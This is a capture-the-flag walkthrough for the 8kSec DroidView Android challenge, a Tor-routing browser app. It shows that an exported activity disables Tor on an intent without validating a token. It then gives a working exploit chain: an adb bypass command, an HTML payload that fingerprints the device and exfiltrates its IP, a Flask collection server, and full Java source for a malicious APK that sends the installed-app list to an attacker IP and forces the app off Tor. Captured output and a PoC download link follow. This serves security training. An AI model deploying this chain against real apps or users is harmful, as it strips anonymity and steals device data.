**Description**: Worried about your online privacy? DroidView provides unmatched protection for your browsing activities! Our advanced security solution routes all your traffic through the secure Tor network, ensuring complete anonymity.

**Link**: https://academy.8ksec.io/course/android-application-exploitation-challenges

![[8ksec-DroidView_1.png]]

Install the `.apk` using **ADB**
```bash
adb install -r DroidView.apk
```

We can see that we can *load any arbitrary* URL *manually*. With a *toggle* that **enable "Tor Security"**.

Let's inspect the **source code** using **JADX**.
### Exploring the Application
Looking in the `AndroidManifest.xml` file, we can see that the *package name* is `com.eightksec.droidview`.

And we have just *one activity*: `com.eightksec.droidview.MainActivity`.

This activity **can handle some intents**:
```XML
<activity
    android:name="com.eightksec.droidview.MainActivity"
    android:exported="true"
    android:configChanges="screenSize|orientation">
    
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
    
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="http"/>
        <data android:scheme="https"/>
    </intent-filter>
    
    <intent-filter>
        <action android:name="com.eightksec.droidview.LOAD_URL"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
    
    <intent-filter>
        <action android:name="com.eightksec.droidview.TOGGLE_SECURITY"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</activity>
```
The most important:

- `com.eightksec.droidview.LOAD_URL`

- `com.eightksec.droidview.TOGGLE_SECURITY`

Also, here we have this **service**:
```XML
<service
    android:name="com.eightksec.droidview.TokenService"
    android:exported="true">
    
    <intent-filter>
        <action android:name="com.eightksec.droidview.ITokenService"/>
        <action android:name="com.eightksec.droidview.TOKEN_SERVICE"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</service>
```

Let's see the **java code**!

Starting with **`MainActivity`** class, we have a *lot of functions* that we need analyze.

First, we can see some variables:
```java
public static final String ACTION_LOAD_URL = "com.eightksec.droidview.LOAD_URL";
public static final String ACTION_TOGGLE_SECURITY = "com.eightksec.droidview.TOGGLE_SECURITY";
public static final String EXTRA_ENABLE_SECURITY = "enable_security";
public static final String EXTRA_SECURITY_TOKEN = "security_token";
public static final String EXTRA_URL = "url";
```

In order to *prioritize the methods and functions*, I will mention just relevant.

`onCreate(...)`function:
```java
protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    EdgeToEdge.enable(this);
    setContentView(C0487R.layout.activity_main);
    
    SecurityTokenManager securityTokenManager = SecurityTokenManager.getInstance(this);
    this.securityTokenManager = securityTokenManager;
    securityTokenManager.initializeSecurityToken();
    
    startService(new Intent(this, (Class<?>) TokenService.class));
    
    ViewCompat.setOnApplyWindowInsetsListener(findViewById(C0487R.id.main), new OnApplyWindowInsetsListener() {
        @Override
        public final WindowInsetsCompat onApplyWindowInsets(View view, WindowInsetsCompat windowInsetsCompat) {
            return MainActivity.lambda$onCreate$0(view, windowInsetsCompat);
        }
    });
    
    this.webView = (WebView) findViewById(C0487R.id.webview);
    this.urlEditText = (TextInputEditText) findViewById(C0487R.id.edit_url);
    this.loadButton = (MaterialButton) findViewById(C0487R.id.btn_load);
    this.progressBar = (ProgressBar) findViewById(C0487R.id.progress_circular);
    this.securitySwitch = (SwitchMaterial) findViewById(C0487R.id.switch_security);
    
    setupWebView();
    
    boolean z = false;
    boolean z2 = getPreferences(0).getBoolean("security_enabled", true);
    this.securityEnabled = z2;
    this.securitySwitch.setChecked(z2);
    
    ContextCompat.registerReceiver(this, this.securityToggleReceiver, new IntentFilter(ACTION_TOGGLE_SECURITY), 2);
    
    this.securitySwitch.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
        @Override
        public final void onCheckedChanged(CompoundButton compoundButton, boolean z3) {
            MainActivity.this.m235lambda$onCreate$1$comeightksecdroidviewMainActivity(compoundButton, z3);
        }
    });
    
    Intent intent = getIntent();
    if (intent != null) {
        String action = intent.getAction();
        if (ACTION_LOAD_URL.equals(action) || "android.intent.action.VIEW".equals(action)) {
            z = true;
        }
    }
    
    if (this.securityEnabled && !z) {
        startTor();
    }
    
    this.loadButton.setOnClickListener(new View.OnClickListener() {
        @Override
        public final void onClick(View view) {
            MainActivity.this.m236lambda$onCreate$2$comeightksecdroidviewMainActivity(view);
        }
    });
    
    handleIntent(getIntent());
}
```

This method:

- Initialize `SecurityTokenManager` and **start** `TokenService`.

- Configure **WebView** (`setupWebView()`).

- Register `BroadcastReceiver` `securityToggleReceiver` for **`ACTION_TOGGLE_SECURITY`**.

- *Read the persisted* `security_enabled` state and, *if applicable*, call `startTor()`.

- Process the **incoming intent** with `handleIntent(getIntent())`.

Next, we have the `onNewIntent(Intent intent)` function:
```java
protected void onNewIntent(Intent intent) {
    super.onNewIntent(intent);
    
    if (ACTION_TOGGLE_SECURITY.equals(intent.getAction())) {
        handleSecurityToggle(intent);
    } else {
        handleIntent(intent);
    }
}
```
If **action** = **`ACTION_TOGGLE_SECURITY`** → `handleSecurityToggle(intent)`.

Else → `handleIntent(intent)`.

Function `handleIntent()` code:
```java
private void handleIntent(Intent intent) {
    this.isExternalRequest = false;
    String str = null;
    
    if (intent != null) {
        String action = intent.getAction();
        
        if ("android.intent.action.VIEW".equals(action)) {
            Uri data = intent.getData();
            if (data != null) {
                String uri = data.toString();
                this.isExternalRequest = true;
                str = uri;
            }
        } else if (ACTION_LOAD_URL.equals(action)) {
            str = intent.getStringExtra(EXTRA_URL);
            this.isExternalRequest = true;
        }
    }
    
    if (str != null && !str.isEmpty()) {
        this.urlEditText.setText(str);
        
        if (this.isExternalRequest && !this.securityEnabled) {
            clearWebViewProxy();
            loadUrl();
            return;
        }
        
        boolean z = this.securityEnabled;
        if (!z || this.torReady) {
            loadUrl();
            return;
        } else {
            if (z) {
                this.pendingUrl = str;
                startTor();
                return;
            }
            return;
        }
    }
    
    if (this.urlEditText.getText().toString().isEmpty()) {
        this.urlEditText.setText("https://check.torproject.org");
    }
}
```
This method:

- Accepts **ACTION_VIEW (HTTP/HTTPS)** and **ACTION_LOAD_URL (extra "URL")**.

- Set `isExternalRequest` = **true**.

- If `securityEnabled` and `!torReady` → delay with **`pendingUrl`** + **`startTor()`**; **otherwise**, **`loadUrl()`**.

And the **vulnerable code** is `handleSecurityToggle()`:
```java
private void handleSecurityToggle(Intent intent) {
    if (intent == null) {
        return;
    }
    
    try {
        boolean booleanExtra = intent.getBooleanExtra(EXTRA_ENABLE_SECURITY, true);
        this.securitySwitch.setChecked(booleanExtra);
        setSecurityEnabled(booleanExtra);
        
        if (booleanExtra || this.webView.getUrl() == null || this.webView.getUrl().equals("about:blank")) {
            return;
        }
        
        final String url = this.webView.getUrl();
        clearWebViewProxy();
        this.webView.clearCache(true);
        this.webView.clearHistory();
        this.webView.loadUrl("about:blank");
        
        new Handler().postDelayed(new Runnable() {
            @Override
            public final void run() {
                MainActivity.this.m53xdf6bc950(url);
            }
        }, 500L);
    } catch (Exception e) {
        Toast.makeText(this, "Error toggling security: " + e.getMessage(), Toast.LENGTH_SHORT).show();
    }
}
```
This function:

- **Read** `enable_security` and call **`setSecurityEnabled(boolean)`** **WITHOUT validating the token**.

- *If security is disabled* and the *current page ≠ about:blank*, clear the proxy/cache and **reload the URL**.

Also we can notice the `setupWebView()` with this properties:
```java
WebSettings settings = this.webView.getSettings();
settings.setJavaScriptEnabled(true);
settings.setDomStorageEnabled(true);
settings.setCacheMode(WebSettings.LOAD_DEFAULT);
settings.setAllowContentAccess(true);
settings.setAllowFileAccess(false);
settings.setBuiltInZoomControls(true);
settings.setDisplayZoomControls(false);
settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
settings.setBlockNetworkImage(false);
settings.setBlockNetworkLoads(false);
```

And finally, `startTor()` / `stopTor()`

But, *most important*, **`stopTor()`**
```java
private void stopTor() {
    this.torReady = false;
    BroadcastReceiver broadcastReceiver = this.torStatusReceiver;
    
    if (broadcastReceiver != null) {
        try {
            unregisterReceiver(broadcastReceiver);
            this.torStatusReceiver = null;
        } catch (Exception unused) {
        }
    }
    
    try {
        stopService(new Intent(this, (Class<?>) TorService.class));
        clearWebViewProxy();
        
        Intent intent = new Intent(this, (Class<?>) TorService.class);
        intent.setAction(TorControlCommands.SIGNAL_SHUTDOWN);
        stopService(intent);
    } catch (Exception unused2) {
    }
    
    this.executor.execute(new Runnable() {
        @Override
        public final void run() {
            MainActivity.this.m240lambda$stopTor$6$comeightksecdroidviewMainActivity();
        }
    });
}
```

And we have the *entry point* in this **Broadcast Receiver**: 
```java
class C04831 extends BroadcastReceiver {
    C04831() {
    }

    @Override // android.content.BroadcastReceiver
    public void onReceive(final Context context, Intent intent) {
        if (MainActivity.ACTION_TOGGLE_SECURITY.equals(intent.getAction())) {
            try {
                final boolean booleanExtra = intent.getBooleanExtra(MainActivity.EXTRA_ENABLE_SECURITY, true);
                String stringExtra = intent.getStringExtra(MainActivity.EXTRA_SECURITY_TOKEN);
                
                if (!booleanExtra && !MainActivity.this.validateSecurityToken(stringExtra)) {
                    Toast.makeText(context, "Error: Invalid security token", Toast.LENGTH_SHORT).show();
                } else {
                    MainActivity.this.handler.post(new Runnable() {
                        @Override
                        public final void run() {
                            MainActivity.C04831.this.m241lambda$onReceive$0$comeightksecdroidviewMainActivity$1(booleanExtra, context);
                        }
                    });
                }
            } catch (Exception unused) {
            }
        }
    }

    /* renamed from: lambda$onReceive$0$com-eightksec-droidview-MainActivity$1, reason: not valid java name */
    /* synthetic */ void m241lambda$onReceive$0$comeightksecdroidviewMainActivity$1(boolean z, Context context) {
        try {
            MainActivity.this.securitySwitch.setChecked(z);
            MainActivity.this.setSecurityEnabled(z);
            Toast.makeText(context, z ? "Enabling Tor Security" : "Disabling Tor Security", Toast.LENGTH_SHORT).show();
            
            if (z || MainActivity.this.webView.getUrl() == null) {
                return;
            }
            
            String url = MainActivity.this.webView.getUrl();
            MainActivity.this.webView.loadUrl("about:blank");
            MainActivity.this.webView.loadUrl(url);
        } catch (Exception e) {
            Toast.makeText(context, "Error toggling security: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }
}
```
This receiver:

- **Only validate the token when receiving a broadcast**: if `enable=false` and `!validateSecurityToken(token)` → “**Invalid security token**”.

- If **OK** → `securitySwitch.setChecked(z)` + `setSecurityEnabled(z)`.

Let's move to **`SecurityTokenManager`** class.

We can see an **hardcoded token**
```java
private static final String HARDCODED_TOKEN = "8dhf7yh3n47yt348ty9384ty9384t3y84t";
```
But we don't need that.

Also, `initializeSecurityToken()` that if **it doesn't exist**: generate random 32B → AES-CBC with random IV and key derived from `HARDCODED_TOKEN`.

Then, save Base64 to SQLite.

Another functions, `validateToken(String t)` and `getCurrentToken()`.

Nothing useful for our attack.

Exploring **`TokenService`**, we can notice an `onBind()` that *return* `ITokenServiceStub`.
```java
public class TokenService extends Service {
    private static final String TAG = "TokenService";
    private final ITokenServiceStub binder = new ITokenServiceStub();

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return this.binder;
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
    }

    public class ITokenServiceStub extends ITokenService.Stub {
        private static final String DESCRIPTOR = "com.eightksec.droidview.ITokenService";
        static final int TRANSACTION_disableSecurity = 2;
        static final int TRANSACTION_getSecurityToken = 1;

        public ITokenServiceStub() {
        }

        @Override // com.eightksec.droidview.ITokenService
        public boolean disableSecurity() throws RemoteException {
            return true;
        }

        @Override // android.os.Binder
        public boolean onTransact(int i, Parcel parcel, Parcel parcel2, int i2) throws RemoteException {
            if (i == TRANSACTION_getSecurityToken) {
                parcel.enforceInterface(DESCRIPTOR);
                String securityToken = getSecurityToken();
                parcel2.writeNoException();
                parcel2.writeString(securityToken);
                return true;
            }
            if (i == TRANSACTION_disableSecurity) {
                parcel.enforceInterface(DESCRIPTOR);
                boolean disableSecurity = disableSecurity();
                parcel2.writeNoException();
                parcel2.writeInt(disableSecurity ? 1 : 0);
                return true;
            }
            if (i == 1598968902) {
                parcel2.writeString(DESCRIPTOR);
                return true;
            }
            return super.onTransact(i, parcel, parcel2, i2);
        }

        @Override // com.eightksec.droidview.ITokenService
        public String getSecurityToken() throws RemoteException {
            return SecurityTokenManager.getInstance(TokenService.this).getCurrentToken();
        }
    }
}
```
- **`ITokenServiceStub`**:

    - `getSecurityToken()` → `SecurityTokenManager.getCurrentToken()`
  
    - `disableSecurity()` → `true` (stub)
  
    - `onTransact` exposes transactions 1 (`getSecurityToken`) and 2 (`disableSecurity`)

- **Manifest:** `<service android:exported="true">` with actions `ITokenService`/`TOKEN_SERVICE`. **WITHOUT PERMISSIONS**.

Now, in the *interface* **``ITokenService``** (AIDL) we can notice:
```java
public boolean disableSecurity() throws RemoteException {
    return false;
}
```

Finally, **`TokenClient`** that have a *callback* `getSecurityToken(Callback)`:

- `bindService()` to `com.eightksec.droidview.ITokenService`; above `onServiceConnected` invoke `getSecurityToken()`.
```java
public void getSecurityToken(TokenCallback tokenCallback) {
    this.callback = tokenCallback;
    Intent intent = new Intent("com.eightksec.droidview.ITokenService");
    intent.setPackage("com.eightksec.droidview");
    
    if (this.context.bindService(intent, this.serviceConnection, Context.BIND_AUTO_CREATE) || tokenCallback == null) {
        return;
    }
    
    tokenCallback.onError("Failed to bind to token service");
}
```
### Bypassing Tor Security
First we need **disable/bypass** the **Tor Security** protection.

In the Main Activity, we saw that there are some intents, and passing as extras the **status** of the Tor security.

Active the *toggle* for *Tor Security* and then let's check that using **ADB**
```bash
adb shell am start -n com.eightksec.droidview/.MainActivity \
  -a com.eightksec.droidview.TOGGLE_SECURITY --ez enable_security false \
  --activity-single-top
```
We send the extra (`ez` for boolean values) `enable_security` as *false*.

The `--activity-single-top` is used for test due that we already was launched the application.

And we can notice that **successfully we can bypass the mechanism**.

This can be *exploited* crafting a *malicious application* that send an intent to target app with the *same configuration*.
### Crafting the payload
According to challenge specifications, we must create an `payload.html` file that **theft device information**.

This is the *HTML code that will fulfill one of the requirements 8kSec asks* of us for the challenge: *exfiltrating the IP address, User Agent, and other elements*.
```HTML
<!doctype html>

<meta charset="utf-8">
<title>PoC</title>
<body></body>

<script>
(async () => {
  // avoiding urls
  try { history.replaceState({}, "", "/"); } catch(e){}

  // basic fingerprint from WebView
  const n = navigator;
  const info = {
    ua: n.userAgent,
    lang: n.language,
    platform: n.platform,
    mem: n.deviceMemory || null,
    cores: n.hardwareConcurrency || null,
    screen: { w: screen.width, h: screen.height, p: devicePixelRatio },
    ts: Date.now()
  };

  // get the external IP
  let ip_ext = "unknown";
  try {
    const r = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
    ip_ext = (await r.json()).ip || "unknown";
  } catch (_) {}

  // exfil
  await fetch("/collect", {
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify({ ip_ext, info, apps: [] })
  });

  // optional, a landing that we can config in the flask server
  location.replace("/ok");
})();
</script>
```
### Crafting the Flask server
We can craft a *simple Flask server* like:
```python
from flask import Flask, request, send_from_directory, jsonify
from datetime import datetime
import os, json

APP_DIR = os.path.dirname(os.path.abspath(__file__))
# save the content in a log file
LOG = os.path.join(APP_DIR, "captures.log")

app = Flask(__name__)

@app.get("/")
def root():
    # redirect to payload.html
    return send_from_directory(APP_DIR, "payload.html")

@app.get("/ok")
def ok():
    # our landing page, just an OK
    return "<h1>OK</h1>"

# will collect all the data and applications using the package name enumerator
@app.post("/collect")
def collect():
    try:
        data = request.get_json(force=True, silent=True) or {}
    except Exception:
        data = {"_raw": request.data.decode("utf-8", "ignore")}

    # verify apps
    if data.get("apps"):
        print("INSTALLED APPLICATIONS:", len(data["apps"]))

    entry = {
        "ts": datetime.utcnow().isoformat()+"Z",
        "remote_addr": request.headers.get("X-Forwarded-For", request.remote_addr),
        "ua": request.headers.get("User-Agent"),
        "data": data
    }
    print("[+] hit:", json.dumps(entry, ensure_ascii=False))
    with open(LOG, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")
    return jsonify({"ok": True})

# serve the server in port 8080
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)
```
### PoC - APK
Finally, the code that will trigger all of above.

Since we need **get the package name** for all *apps installed*, and then, **send to our flask server**, we need add into our `AndroidManifest.xml` file the *internet permission*.
```XML
<uses-permission android:name="android.permission.INTERNET" />
```
And, very important, the `android:usesCleartextTraffic="true"` in the `<application` attributes.

Full `AndroidManifest.xml` file:
```XML
<?xml version="1.0" encoding="utf-8"?>  
<manifest xmlns:android="http://schemas.android.com/apk/res/android"  
xmlns:tools="http://schemas.android.com/tools"  
package="com.lautarovculic.droidviewexploit">  
  
    <uses-permission android:name="android.permission.INTERNET" />  
  
    <application  
        android:allowBackup="true"  
        android:label="@string/app_name"  
        android:icon="@mipmap/ic_launcher"  
        android:roundIcon="@mipmap/ic_launcher_round"  
        android:supportsRtl="true"  
        android:usesCleartextTraffic="true"  
        android:theme="@style/Theme.DroidViewExploit">  
        <activity android:name=".MainActivity" android:exported="true">  
            <intent-filter>  
                <action android:name="android.intent.action.MAIN"/>  
                <category android:name="android.intent.category.LAUNCHER"/>  
            </intent-filter>  
        </activity>  
    </application>  
</manifest>
```

Let's create the **Java code**. I just needed the **`MainActivity`** class for the logic.
```java
package com.lautarovculic.droidviewexploit;  
  
import android.content.ComponentName;  
import android.content.Intent;  
import android.content.pm.ApplicationInfo;  
import android.content.pm.PackageManager;  
import android.net.Uri;  
import android.os.Bundle;  
import android.os.Handler;  
import android.util.Log;  
import androidx.appcompat.app.AppCompatActivity;  
import org.json.JSONArray;  
import org.json.JSONObject;  
import java.io.OutputStream;  
import java.net.HttpURLConnection;  
import java.net.URL;  
import java.util.List;  
  
public class MainActivity extends AppCompatActivity {  
  
    @Override  
    protected void onCreate(Bundle savedInstanceState) {  
        super.onCreate(savedInstanceState);  
  
        // get all the installed applications and put in a JSON array  
        PackageManager pm = getPackageManager();  
        List<ApplicationInfo> apps = pm.getInstalledApplications(0);  
        JSONArray appsArray = new JSONArray();  
        for (ApplicationInfo app : apps) {  
            appsArray.put(app.packageName);  
        }  
  
        // first exfiltrate/send the applications list to the server  
        new Thread(() -> {  
            try {  
                URL url = new URL("http://192.168.0.124:8080/collect");  
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();  
                conn.setRequestMethod("POST");  
                conn.setDoOutput(true);  
                conn.setRequestProperty("Content-Type", "application/json");  
  
                JSONObject payloadJson = new JSONObject();  
                payloadJson.put("ip_ext", "local_exploit");  
                payloadJson.put("info", new JSONObject());  
                payloadJson.put("apps", appsArray);  
  
                try (OutputStream os = conn.getOutputStream()) {  
                    os.write(payloadJson.toString().getBytes("UTF-8"));  
                }  
  
                int code = conn.getResponseCode();  
                Log.d("EXPLOIT", "POST /collect -> " + code);  
                conn.disconnect();  
            } catch (Exception e) {  
                Log.e("EXPLOIT", "exfil failed", e);  
            }  
  
            // And then, launch the DroidView app  
            runOnUiThread(() -> {  
                Intent open = new Intent(Intent.ACTION_VIEW, Uri.parse("http://192.168.0.124:8080/"));  
                open.setPackage("com.eightksec.droidview");  
                open.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);  
                startActivity(open);  
  
                // very important, disable the toggle  
                new Handler().postDelayed(() -> {  
                    Intent toggle = new Intent("com.eightksec.droidview.TOGGLE_SECURITY");  
                    toggle.setComponent(new ComponentName("com.eightksec.droidview", "com.eightksec.droidview.MainActivity"));  
                    toggle.putExtra("enable_security", false);  
                    toggle.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);  
                    startActivity(toggle);  
                }, 1000);  
            });  
        }).start();  
    }  
}
```

**Download PoC**: https://lautarovculic.com/my_files/DroidViewExploit.apk

Notice that we *first send the application* list to our server **before** that send the *intent* to DroidView.

This is because **if we send the intent to DroidView first**, our app will be *in background*, and DroidView in *foreground*, and the *theft of packages names* will never happen in this order.

Put the *server* to run and then, *launch the application*. Remember change the IP server by your own.
```bash
python3 server.py
```
Output:
```HTTP
192.168.0.6 - - [31/Aug/2025 14:44:36] "POST /collect HTTP/1.1" 200 -
192.168.0.6 - - [31/Aug/2025 14:44:38] "GET / HTTP/1.1" 200 -
```

```json
{
  "INSTALLED_APPLICATIONS": 235,
  "hit": {
    "ts": "2025-08-31T17:43:33.255927Z",
    "remote_addr": "192.168.0.6",
    "ua": "Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 8 Build/RKQ1.201004.002)",
    "data": {
      "ip_ext": "local_exploit",
      "info": {},
      "apps": [
        "com.miui.screenrecorder",
        "com.lautarovculic.droidviewexploit",
        "com.qualcomm.qti.qcolor",
        "com.google.android.ext.services",
        "com.qualcomm.qti.improvetouch.service",
        "com.android.providers.telephony",
        "com.android.dynsystem",
        "com.miui.powerkeeper",
        "com.goodix.fingerprint",
        "com.xiaomi.miplay_client",
        "com.miui.fm",
        "com.android.providers.calendar"
        [...]
        [...]
        [...]
        [...]
        [...]
{
  "hit": {
    "ts": "2025-08-31T17:44:39.523716Z",
    "remote_addr": "192.168.0.6",
    "ua": "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/139.0.7258.143 Mobile Safari/537.36",
    "data": {
      "ip_ext": "REDACTED",
      "info": {
        "ua": "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/139.0.7258.143 Mobile Safari/537.36",
        "lang": "en-US",
        "platform": "Linux aarch64",
        "mem": null,
        "cores": 8,
        "screen": {
          "w": 393,
          "h": 851,
          "p": 2.75
        },
        "ts": 1756662280365
      },
      "apps": []
    }
  }
}
```

I hope you found it useful (:
